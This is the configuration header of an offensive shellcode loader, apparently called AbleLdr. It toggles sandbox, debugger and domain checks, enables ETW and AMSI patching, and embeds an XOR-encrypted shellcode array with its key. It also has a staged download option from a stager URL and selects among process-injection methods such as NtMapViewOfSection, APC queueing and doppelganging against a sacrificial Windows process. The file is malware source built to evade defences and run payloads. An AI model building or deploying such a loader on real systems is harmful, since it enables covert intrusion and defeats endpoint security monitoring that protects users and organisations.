#ifndef ABLELDR_CONFIG_HPP
#define ABLELDR_CONFIG_HPP

// Guardrails
#define DOMAIN_CHECK 1
#define IP_CHECK 1
#define SANDBOX_CHECK 1

// Anti Sandbox
#define ANTI_SANDBOX_ENABLED 1
#define SLEEP_ENABLED 1

//
// TODO:
// Add Ekko
// Add Foliage
//
#define SLEEP_TIME 5000
#define SLEEP_METHOD 1
#if SLEEP_METHOD == 1
#define SleepMethod(sleep_time) malapi::SleepMs(sleep_time)
#endif

// Patching
#define PATCH_ENABLED_ETW 1
#define PATCH_METHOD_ETW 1

#define PATCH_ENABLED_AMSI 1
#define PATCH_METHOD_AMSI 1

// Anti Debugging
#define ANTI_DEBUG_ENABLED 1

// Encryption

unsigned char key[] = {
	0x41,0x41
};

#define CONFIG_ENCRYPTION_METHOD 2
#if CONFIG_ENCRYPTION_METHOD == 1
#define DecryptShellcode(shellcode, shellcode_len, key, key_len) malapi::NONE(shellcode, shellcode_len, key, key_len) // No Decryption
#elif CONFIG_ENCRYPTION_METHOD == 2
#define DecryptShellcode(shellcode, shellcode_len, key, key_len) malapi::XOR(shellcode, shellcode_len, key, key_len) // XOR Decrypt
#elif CONFIG_ENCRYPTION_METHOD == 3
#define DecryptShellcode(shellcode, shellcode_len, key, key_len) malapi::RC4(shellcode, shellcode_len, key, key_len) // RC4 Decrypt
#endif

// Obfuscation
#define CONFIG_OBFUSCATION_METHOD 1

// Payloads

//
// 1 - Stageless
// 2 - Staged
//
#define CONFIG_STAGE_METHOD 1

#if CONFIG_STAGE_METHOD == 1
unsigned char shellcode[] = {
		0x11,0x15,0x19,0x27,0xc2,0xa5,0xb1,0x11,0x70,0x81,0x01,0xd3,0x35,0x0e,0x21,
		0x0b,0x13,0x29,0x22,0x20,0x2d,0x22,0x15,0x18,0x13,0x10,0x25,0xca,0x33,0x71,
		0xca,0x37,0x4d,0xca,0x37,0x4d,0xec,0xca,0x71,0xca,0x3f,0x59,0xca,0x1e,0x7d,
		0xca,0x1d,0x5e,0x39,0xca,0x35,0x5e,0x61,0x40,0xbf,0xca,0x15,0x5e,0x65,0x4e,
		0xf6,0x6d,0x56,0x03,0x03,0xec,0xc0,0x7d,0x46,0x16,0x28,0x2f,0x04,0x34,0xb1,
		0xca,0x35,0x5e,0x5d,0x40,0xbf,0x42,0x7d,0xef,0xbe,0x96,0x19,0x19,0x20,0x1d,
		0xd3,0x19,0x82,0x11,0x10,0x12,0x17,0x16,0x14,0xf3,0x21,0x29,0x22,0x20,0x2d,
		0x22,0x15,0x18,0x09,0x68,0x95,0x24,0x09,0xca,0x73,0x09,0xca,0x37,0x59,0x09,
		0xca,0x37,0x51,0x09,0xec,0x09,0xca,0x71,0x09,0xca,0x3f,0x71,0x42,0x16,0x7d,
		0xca,0x1d,0x56,0x69,0xca,0x35,0x5e,0x61,0x09,0x40,0xbf,0xca,0x15,0x5e,0x65,
		0x4e,0xf6,0x6d,0x56,0xcc,0x13,0x43,0xec,0xc0,0x7d,0x46,0x16,0x28,0x2f,0x04,
		0x34,0xae,0xca,0x35,0x5e,0x5d,0x09,0x40,0xbf,0xca,0x75,0xef,0x09,0x40,0xb6,
		0xd8,0xbe,0x96,0x09,0xc2,0x85,0x29,0x1c,0x1e,0x1f,0x1a,0x18,0x1b,0x1d,0x19,0x82
};

#else

#define STAGER_SSL FALSE
#define STAGER_URL L"127.0.0.1"
#define STAGER_FILE L"/shellcode-enc.bin"
#endif

// Targets List
// Accept user input for a list of processes to inject into

//
// 1 - Create Suspended Process
// 2 - Thread to Address of Entry Point
// 3 - Existing Process
//
#define CONFIG_CREATE_PROCESS_METHOD 1

#if CONFIG_CREATE_PROCESS_METHOD == 1 or CONFIG_CREATE_PROCESS_METHOD == 2

#if _WIN64
#define CONFIG_SACRIFICIAL_PROCESS "C:\\Windows\\System32\\LaunchWinApp.exe"
//#define CONFIG_SACRIFICIAL_PROCESS "C:\\Windows\\System32\\notepad.exe"
#else
#define CONFIG_SACRIFICIAL_PROCESS "C:\\Windows\\SysWOW64\\LaunchWinApp.exe"
#endif

#else
#endif

// Execution Methods
#define CONFIG_EXECUTION_METHOD 4

#if CONFIG_EXECUTION_METHOD == 1
#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) malapi::InjectionCreateRemoteThread(phandle, shellcode, shellcode_len, ahandle)
#elif CONFIG_EXECUTION_METHOD == 2
#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) malapi::InjectionRemoteHijack(phandle, shellcode, shellcode_len, ahandle)
#elif CONFIG_EXECUTION_METHOD == 3
#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) malapi::InjectionAddressOfEntryPoint(phandle, shellcode, shellcode_len, ahandle)
#elif CONFIG_EXECUTION_METHOD == 4
#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) malapi::InjectionNtMapViewOfSection(phandle, shellcode, shellcode_len, ahandle)
#elif CONFIG_EXECUTION_METHOD == 5
#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) malapi::InjectionDoppleganger(phandle, shellcode, shellcode_len, ahandle)
#elif CONFIG_EXECUTION_METHOD == 6
#define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) malapi::InjectionQueueUserAPC(phandle, shellcode, shellcode_len, ahandle)
#endif

//
// 1 - Normal Executable
// 2 - DLL
// 3 - Service Binary (In Progress)
//
#define CONFIG_COMPILATION_OPTION 1

#endif
